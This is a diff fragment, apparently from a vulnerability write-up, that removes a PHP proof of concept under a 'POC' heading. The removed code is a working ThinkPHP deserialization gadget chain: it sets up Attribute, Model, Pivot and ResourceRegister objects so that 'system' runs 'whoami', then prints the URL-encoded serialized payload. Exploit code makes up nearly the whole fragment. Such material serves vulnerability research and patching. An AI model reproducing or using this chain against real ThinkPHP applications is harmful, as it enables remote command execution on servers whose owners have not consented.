@@ -42,68 +42,6 @@ class Index extends BaseController
 
 POC
 
-```
-<?php
-
-namespace think\model\concern;
-
-trait Attribute
-{
-    private $data = ["key" => ["key1" => "whoami"]];
-    private $withAttr = ["key"=>["key1"=>"system"]];
-    protected $json = ["key"];
-}
-namespace think;
-
-abstract class Model
-{
-    use model\concern\Attribute;
-    private $lazySave;
-    protected $withEvent;
-    private $exists;
-    private $force;
-    protected $table;
-    protected $jsonAssoc;
-    function __construct($obj = '')
-    {
-        $this->lazySave = true;
-        $this->withEvent = false;
-        $this->exists = true;
-        $this->force = true;
-        $this->table = $obj;
-        $this->jsonAssoc = true;
-    }
-}
-namespace think\model;
-
-use think\Model;
-
-class Pivot extends Model
-{
-}
-
-
-namespace think\route;
-use think\model\Pivot;
-class ResourceRegister
-{
-    protected $registered = false;
-    protected $resource;
-    function __construct()
-    {
-        $this->registered=false;
-        $this->resource=new Pivot(new Pivot());
-    }
-}
-
-
-namespace think;
-use think\route\ResourceRegister;
-$r=new ResourceRegister();
-echo urlencode(serialize($r));
-```
-
-
 
 ```java
 <?php
